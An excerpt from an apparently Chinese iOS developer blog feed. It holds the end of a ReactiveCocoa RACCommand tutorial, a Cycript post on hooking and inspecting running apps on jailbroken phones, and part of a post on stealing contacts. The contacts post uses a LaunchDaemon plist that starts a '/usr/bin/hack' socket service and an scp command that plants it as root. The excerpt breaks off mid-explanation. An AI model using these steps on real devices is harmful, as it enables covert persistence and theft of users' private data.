isValidEmail]);</div><div class="line">      &#125;];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> _emailValidSignal;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>这看起来真是一大坨~看还是从小的地方来看吧。我们真正感兴趣RACCommand<code>RACCommand</code>创建部分是以下代码：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- (RACCommand *)subscribeCommand &#123;</div><div class="line">  <span class="keyword">if</span> (!_subscribeCommand) &#123;</div><div class="line">      <span class="built_in">NSString</span> *email = <span class="keyword">self</span>.email;</div><div class="line">      _subscribeCommand = [[RACCommand alloc] initWithEnabled:<span class="keyword">self</span>.emailValidSignal signalBlock:^RACSignal *(<span class="keyword">id</span> input) &#123;</div><div class="line">          <span class="keyword">return</span> [SubscribeViewModel postEmail:email];</div><div class="line">      &#125;];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> _subscribeCommand;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Command通过一个<code>enabledSignal</code>参数来初始化。这个Signal可以指示Command是否可以被执行。在我们本次的用例中Command应该在用户合法输入email时允许被执行。<code>self.emailValidSignal</code>就是用来在email发生变化发送<code>NO</code>或者<code>YES</code>指示的。</p>
<p><code>signalBlock</code>参数在Command需要执行时被调用。block应该返回一个signal。当我们设置<code>allowsConcurrentExecution</code>为<code>NO</code>，Command将会看守这个signal并且在本次执行未完成前不允许任何新的执行。</p>
<p>由于本次用例中的Command来自于按钮的<code>rac_command</code>（在<code>UIButtton+RACCommandSupport</code>分类中定义），根据Command是否可以被执行，按钮会自动切换<code>enabled</code>和<code>disabled</code>状态。</p>
<p>当然，Command会在按钮被用户点击的时候自动执行。我们可以通过RACCommand自由的实现这一切。如果你需要手动执行你可以调用<code>-[RACCommand execute:]</code>，参数是可选的，你可以传递nil。我们的用例里不需要参数，不过这里的参数通常会十分有用（按钮可以将自己当做<code>-execute:</code>的参数传入）。<code>-execute:</code>方法也是一个你可以监控执行状态的地方，你可以这样写：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[[<span class="keyword">self</span>.viewModel.subscribeCommand execute:<span class="literal">nil</span>] subscribeCompleted:^&#123;</div><div class="line">  <span class="built_in">NSLog</span>(<span class="string">@"The command executed"</span>);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>在我们的用例中按钮为我们调用Command的执行（所以我们不需要手动调用<code>-execute:</code>），所以在Command执行时，为了及时更新UI，我们需要监听Command的另一个属性。我们有几种让人迷惑的地方，<code>RACCommand</code>的<code>executionSignals</code>属性是一个每当Commands开发执行时就发送<code>next:</code>的Signal。问题在于Signal由Command创建，所以Signal中还有一层Signal。每次Command开始执行的时候， 我们会在ViewModel中通过<code>mapSubscribeCommandStateToStatusMessage</code>方法里面获取到一个信号。同时在这个信号里面返回了一个字符串：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RACSignal *startedMessageSource = [<span class="keyword">self</span>.subscribeCommand.executionSignals map:^<span class="keyword">id</span>(RACSignal *subscribeSignal) &#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Sending request..."</span>, <span class="literal">nil</span>);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>假如我们想用更函数的方式，来在Command执行完成后都能获取string，我们需要做更多的工作：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">RACSignal *completedMessageSource = [<span class="keyword">self</span>.subscribeCommand.executionSignals flattenMap:^RACStream *(RACSignal *subscribeSignal) &#123;</div><div class="line">  <span class="keyword">return</span> [[[subscribeSignal materialize] filter:^<span class="built_in">BOOL</span>(RACEvent *event) &#123;</div><div class="line">      <span class="keyword">return</span> event.eventType == RACEventTypeCompleted;</div><div class="line">  &#125;] map:^<span class="keyword">id</span>(<span class="keyword">id</span> value) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Thanks"</span>, <span class="literal">nil</span>);</div><div class="line">  &#125;];</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>当Command执行时，<code>flattenMap:</code>方法调用一个带<code>subscribeSignal</code>参数的block。这个block返回一个新的Signal并且它的值会被传递到下一个返回信号。<code>materialize</code>操作符让我们捕获到一个<code>RACEvent</code>（例如 <code>next:</code> <code>complete</code> 和 <code>error:</code>都是RACEvent的实例）。我们可以在信号完成之后过滤这些<code>event</code>并且映射成一个string。这些解释让你晕了吗，不过你可以去看一下<a href="https://github.com/ReactiveCocoa/ReactiveCocoa/blob/d4924b237720afef62c1334437140bb803fb5242/ReactiveCocoaFramework/ReactiveCocoa/RACStream.h#L98" target="_blank" rel="external">flattenMap:</a>和<a href="https://github.com/ReactiveCocoa/ReactiveCocoa/blob/2d5f163547f2b9c6ee25cf2c9ff8554faf7929f2/ReactiveCocoaFramework/ReactiveCocoa/RACSignal%2BOperations.h#L558" target="_blank" rel="external">materialize</a>的文档以助于你的理解。</p>
<p>我们可以用另一种不同但更容易理解的方式来实现：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@weakify(<span class="keyword">self</span>);</div><div class="line">[<span class="keyword">self</span>.subscribeCommand.executionSignals subscribeNext:^(RACSignal *subscribeSignal) &#123;</div><div class="line">  [subscribeSignal subscribeCompleted:^&#123;</div><div class="line">      @strongify(<span class="keyword">self</span>);</div><div class="line">      <span class="keyword">self</span>.statusMessage = <span class="string">@"Thanks"</span>;</div><div class="line">  &#125;];</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>但是我并不喜欢上面的写法，因为这样会block中的操作会更多并且会更多的在block中使用到<code>self</code>。所以在这里还使用了<code>@weakify</code>和<code>@strongify</code>（在<code>libextobjc</code>中定义）避免循环retain。</p>
<p>关于<code>executionSignals</code>属性，有一个重要的细节。在这里的Signal所发送的event不包含<code>error</code>，所以对于那些有特殊<code>errors</code>属性</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RACSignal *failedMessageSource = [[<span class="keyword">self</span>.subscribeCommand.errors subscribeOn:[RACScheduler mainThreadScheduler]] map:^<span class="keyword">id</span>(<span class="built_in">NSError</span> *error) &#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Error :("</span>, <span class="literal">nil</span>);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>如果我们有三个带有状态消息的Signal，我们可以将他们合并陈搞一个信号并绑定到ViewModel的一个<code>statusMessage</code>属性 (<code>statusMessage</code>绑定ViewController的statusLabel.text)。</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RAC(<span class="keyword">self</span>, statusMessage) = [RACSignal merge:@[startedMessageSource, completedMessageSource, failedMessageSource]];</div></pre></td></tr></table></figure>
<p>那么以上是一个<code>RACCommand</code>在iOS app 开发中的一个example。我相信这种实现逻辑比使用<code>UITextFieldDelegate</code>有更多的优点，能在属性和变量中体现更多的状态。</p>
<h1 id="其他有趣的RACCommand使用细节"><a href="#其他有趣的RACCommand使用细节" class="headerlink" title="其他有趣的RACCommand使用细节"></a>其他有趣的RACCommand使用细节</h1><p><code>RACCommand</code>有一个<code>executing</code>属性，实际上它是一个当<code>execute:</code>时会发送<code>YES</code>，终止时发送<code>NO</code>的信号。在订阅信号时这个信号将会发送它的当前值，如果你只需要获取当前值而不需要获得信号，你可以通过以下方式：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> commandIsExecuting = [[command.executing first] boolValue];</div></pre></td></tr></table></figure>
<p><code>enabled</code>属性也是一个发送<code>YES</code>和<code>NO</code>的信号。当Command通过发送<code>NO</code>的<code>enabledSignal</code>信号创建，或者如果信号在执行并且<code>allowsConcurrentExecutions</code> 为 <code>NO</code>，<code>enabled</code>就会发送<code>NO</code>。</p>
<p><code>-execute:</code>方法会自动订阅原始Signal并且广播它。这意味着你不需要去订阅<code>-execute:</code>返回的信号，但是如果你订阅了也不需要担心它会被执行两次。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x63;&#111;&#x64;&#101;&#114;&#x66;&#105;&#115;&#x68;&#x40;&#x31;&#x36;&#51;&#x2e;&#x63;&#111;&#109;">&#x63;&#111;&#x64;&#101;&#114;&#x66;&#105;&#115;&#x68;&#x40;&#x31;&#x36;&#51;&#x2e;&#x63;&#111;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;原文地址&quot;&gt;&lt;a href=&quot;#原文地址&quot; class=&quot;headerlink&quot; title=&quot;原文地址&quot;&gt;&lt;/a&gt;原文地址&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://codeblog.shape.dk/blog/2013/12/05/reactivecocoa-essentials-understanding-and-using-raccommand/&quot;&gt;点击这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这几天部门的前辈再用RAC的时候问到一个问题，RACCommand在RAC中具体的作用和起到的功能，到底应该如何应用它。&lt;/p&gt;
&lt;p&gt;关于RAC的使用文章非常多，但是大多仅限于介绍和基本的使用方法，很少介绍RAC究竟应该如何优雅的嵌入到项目中。&lt;/p&gt;
&lt;p&gt;在查阅资料的时候发现了此篇博文，写的非常细致，所以做了一次搬运工。&lt;/p&gt;
&lt;p&gt;另，妹子我的英文属于渣渣系列，所以有什么翻译不当，请一定要指教。&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="译文" scheme="http://zhoulingyu.com/tags/%E8%AF%91%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>iOS攻防——（三）Cycript攻·防</title>
    <link href="http://zhoulingyu.com/2016/07/19/iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2/"/>
    <id>http://zhoulingyu.com/2016/07/19/iOS攻防——（三）Cycript攻·防/</id>
    <published>2016-07-19T06:09:36.000Z</published>
    <updated>2016-08-05T06:21:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
<p>Cycript允许开发人员探讨和修改iOS和Mac OS X上运行的应用程序。<br>Cycript是一个理解Objective-C语法的javascript解释器，它能够挂钩正在运行的进程，能够在&gt; 运行时修改应用的很多东西。</p>
<ol>
<li>能够挂钩正在运行的进程，并且找出正被使用的类信息，例如view controllers，内部和第三方库，甚至程序的delegate的名称。</li>
<li>对于一个特定的类，例如View Controller, App delegate或者任何其他的类，我们能够得到所有被使用的方法名称。</li>
<li>能够得到所有实例变量的名称和在程序运行的任意时刻实例变量的值。</li>
<li>能够在运行时修改实例变量的值。</li>
<li>能够执行Method Swizzling，例如替换一个特定方法的实现。</li>
<li>可以在运行时调用任意方法，即使这个方法目前并不在应用的实际代码当中。</li>
</ol>
</blockquote>
<a id="more"></a>
<h1 id="Cycript安装"><a href="#Cycript安装" class="headerlink" title="Cycript安装"></a>Cycript安装</h1><p>在<a href="http://www.cycript.org" target="_blank" rel="external">这里下载</a><br>在<a href="">这里阅读</a>所有Cycript诡计</p>
<h1 id="攻"><a href="#攻" class="headerlink" title="攻"></a>攻</h1><p>先看看怎么用Cycript干点坏事吧</p>
<h2 id="1-给应用弹一个莫名其妙的alert"><a href="#1-给应用弹一个莫名其妙的alert" class="headerlink" title="1. 给应用弹一个莫名其妙的alert"></a>1. 给应用弹一个莫名其妙的alert</h2><h3 id="ssh登陆你的手机（如果不会，上一篇有-）"><a href="#ssh登陆你的手机（如果不会，上一篇有-）" class="headerlink" title="ssh登陆你的手机（如果不会，上一篇有~）"></a>ssh登陆你的手机（如果不会，上一篇有~）</h3><h3 id="找一个app"><a href="#找一个app" class="headerlink" title="找一个app"></a>找一个app</h3><p>这里我找的是以前做的一个app</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps aux | grep blackwidow</div></pre></td></tr></table></figure>
<p>print</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mobile 466 6.6 7.0 508416 36204 ?? Ss 11:22AM 0:09.65 /xxxx/blackwidow</div></pre></td></tr></table></figure>
<p>这样知道进程号是466</p>
<h3 id="hock住"><a href="#hock住" class="headerlink" title="hock住"></a>hock住</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cycript -p 466</div></pre></td></tr></table></figure>
<p>如果你看到出现了cy#，说明你可以开始编写Cycript代码了</p>
<h3 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h3><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 找到widnow</span></div><div class="line">var window = [<span class="built_in">UIApplication</span> sharedApplication].keyWindow;</div><div class="line"><span class="comment">// 初始化一个alert</span></div><div class="line">var alert = [[<span class="built_in">UIAlertView</span> alloc] initWithTitle:<span class="string">@"hack you"</span> message:<span class="string">@"hack you"</span> window cancelButtonTitle:<span class="string">@"cancel"</span> otherButtonTitles:<span class="string">@"yes"</span>, <span class="literal">nil</span>];</div><div class="line"><span class="comment">// 弹出来吧</span></div><div class="line">[alert show];</div></pre></td></tr></table></figure>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-01.PNG-w375" alt=""></p>
<h2 id="2-探索一个app"><a href="#2-探索一个app" class="headerlink" title="2. 探索一个app"></a>2. 探索一个app</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">printMethods</span>(<span class="params">className</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> count = <span class="keyword">new</span> <span class="keyword">new</span> Type(<span class="string">"I"</span>);</div><div class="line">  <span class="keyword">var</span> methods = class_copyMethodList(objc_getClass(className), count);</div><div class="line">  <span class="keyword">var</span> methodsArray = [];</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; *count; i++) &#123;</div><div class="line">    <span class="keyword">var</span> method = methods[i];</div><div class="line">    methodsArray.push(&#123;selector:method_getName(method), implementation:method_getImplementation(method)&#125;);</div><div class="line">  &#125;</div><div class="line">  free(methods);</div><div class="line">  <span class="keyword">return</span> methodsArray;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>调用一下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printMethods(AppDelegate)</div></pre></td></tr></table></figure></p>
<p>输出结果：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-02.png" alt=""></p>
<p>是不是觉得发生了很可怕的事情？该有的都被打印出来了。</p>
<p>你还可以通过试探的方式找出每一个Controller的名字，例如：</p>
<p>insert</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> homeVC= [[[[[UIApplication sharedApplication] keyWindow] subviews] objectAtIndex:<span class="number">0</span>] nextResponder];</div></pre></td></tr></table></figure>
<p>print</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&quot;&lt;HomePageTabBarViewController: 0x156cf200&gt;&quot;</div></pre></td></tr></table></figure>
<p>insert</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> page0VC = [homeVC.childViewControllers objectAtIndex:<span class="number">3</span>]</div></pre></td></tr></table></figure>
<p>print</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&quot;&lt;BaseNavigationController: 0x156decc0&gt;&quot;</div></pre></td></tr></table></figure>
<p>insert<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var meVC = page0VC.topViewController</div></pre></td></tr></table></figure></p>
<p>print<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&quot;&lt;MeViewController: 0x156de940&gt;&quot;</div></pre></td></tr></table></figure></p>
<p>这样，我们就找到了『我的』页面所属Controller。</p>
<p>查看所有的方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printMethods(MeViewController)</div></pre></td></tr></table></figure>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-02.png" alt=""></p>
<p>改个标题试试：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[meVC setCurrentTitle:<span class="string">@"hack you"</span>];</div></pre></td></tr></table></figure>
<p>效果如下：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-04.PNG-w375" alt=""></p>
<p>试想一下，如果MeViewController中或者LoginViewController中有一个方法叫getUserInfo，那么通过Cycript就可以轻而易举的拿到用户信息。</p>
<p>不过Cycript在这里最主要的作用还是偷窥APP和调试APP。<br>当然，好玩的方法还有很多。</p>
<h1 id="防"><a href="#防" class="headerlink" title="防"></a>防</h1><p>知道了Cycript的可怕，在有重要信息藏在代码中的时候，我们也得学会如何放置Cycript修改运行时。</p>
<p>你可以参考<a href="http://www.cocoachina.com/ios/20150511/11801.html" target="_blank" rel="external">这篇文章</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#99;&#x6f;&#100;&#101;&#x72;&#x66;&#x69;&#115;&#104;&#x40;&#49;&#x36;&#x33;&#46;&#99;&#x6f;&#x6d;">&#99;&#x6f;&#100;&#101;&#x72;&#x66;&#x69;&#115;&#104;&#x40;&#49;&#x36;&#x33;&#46;&#99;&#x6f;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Cycript允许开发人员探讨和修改iOS和Mac OS X上运行的应用程序。&lt;br&gt;Cycript是一个理解Objective-C语法的javascript解释器，它能够挂钩正在运行的进程，能够在&amp;gt; 运行时修改应用的很多东西。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;能够挂钩正在运行的进程，并且找出正被使用的类信息，例如view controllers，内部和第三方库，甚至程序的delegate的名称。&lt;/li&gt;
&lt;li&gt;对于一个特定的类，例如View Controller, App delegate或者任何其他的类，我们能够得到所有被使用的方法名称。&lt;/li&gt;
&lt;li&gt;能够得到所有实例变量的名称和在程序运行的任意时刻实例变量的值。&lt;/li&gt;
&lt;li&gt;能够在运行时修改实例变量的值。&lt;/li&gt;
&lt;li&gt;能够执行Method Swizzling，例如替换一个特定方法的实现。&lt;/li&gt;
&lt;li&gt;可以在运行时调用任意方法，即使这个方法目前并不在应用的实际代码当中。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/tags/iOS%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>iOS攻防——（二）如何窃取用户的通讯录信息</title>
    <link href="http://zhoulingyu.com/2016/07/12/iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E8%AE%AF%E5%BD%95%E4%BF%A1%E6%81%AF/"/>
    <id>http://zhoulingyu.com/2016/07/12/iOS攻防——（二）如何窃取用户的通讯录信息/</id>
    <published>2016-07-12T13:31:24.000Z</published>
    <updated>2016-08-05T06:21:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>2016年7月15更新，最近试了一下，发现用nc拿不到数据了，拿数据的代码是没有问题的，直接运行可以拿到数据，但是从mac通过IP和端口拿到的.sqlitedb文件是空文件，博主也正在看为什么~大家有兴趣可以一起找一下原因。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文章基于念茜的iOS攻防系列。<br>本文将会讲解如何窃取用户的通讯录信息。<br>同样在越狱手机环境下。</p>
<h1 id="hack"><a href="#hack" class="headerlink" title="hack"></a>hack</h1><h2 id="1-需要一个plist"><a href="#1-需要一个plist" class="headerlink" title="1. 需要一个plist"></a>1. 需要一个plist</h2><p>需要这样一个plist，它看起来是这样：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png" alt=""></p>
<a id="more"></a>
<p>源文件是这样：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Program<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/bin/hack<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>StandardErrorPath<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>/dev/null<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>SessionCreate<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/bin/hack<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>inetdCompatibility<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>Wait<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">false</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Sockets<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>Listeners<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">key</span>&gt;</span>SockServiceName<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">string</span>&gt;</span>55<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></div></pre></td></tr></table></figure>
<p>SockServiceName指的是通信名称<br>将plist文件传送到至iPhone/System/Library/LaunchDaemons/ 下 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp /Users/zhoulingyu/Desktop/hack.plist root@192.168.31.152:/System/Library/LaunchDaemons/hack.plist</div></pre></td></tr></table></figure>
<h2 id="2-了解一下OS-X的启动原理"><a href="#2-了解一下OS-X的启动原理" class="headerlink" title="2. 了解一下OS X的启动原理"></a>2. 了解一下OS X的启动原理</h2><blockquote>
<ol>
<li>mac固件激活，初始化硬件，加载BootX引导器。</li>
<li>BootX加载内核与内核扩展(kext)。</li>
<li>内核启动launchd进程。</li>
<li>launchd根据/System/Library/LaunchAgents、/System/Library/LaunchDaemons、/Library/LaunchDaemons、Library/LaunchAgents、~/Library/LaunchAgents里的plist配置，启动服务守护进程</li>
</ol>
</blockquote>
<p>解释一下：</p>
<blockquote>
<p>LaunchDaemons是用户未登陆前就启动的服务（守护进程）<br>LaunchAgents是用户登陆后启动的服务（守护进程）</p>
</blockquote>
<p>几个目录下plist文件格式及每个字段的含义：</p>
<table>
<thead>
<tr>
<th style="text-align:center">Key</th>
<th style="text-align:left">Description</th>
<th style="text-align:center">Required</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Label</td>
<td style="text-align:left">The name of the job</td>
<td style="text-align:center">yes</td>
</tr>
<tr>
<td style="text-align:center">ProgramArguments</td>
<td style="text-align:left">Strings to pass to the program when it is executed</td>
<td style="text-align:center">yes</td>
</tr>
<tr>
<td style="text-align:center">UserName</td>
<td style="text-align:left">The job will be run as the given user, who may not necessarily be the one who submitted it to launchd.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">inetdCompatibility</td>
<td style="text-align:left">Indicates that the daemon expects to be run as if it were launched by inetd</td>
<td style="text-align:center">no</td>
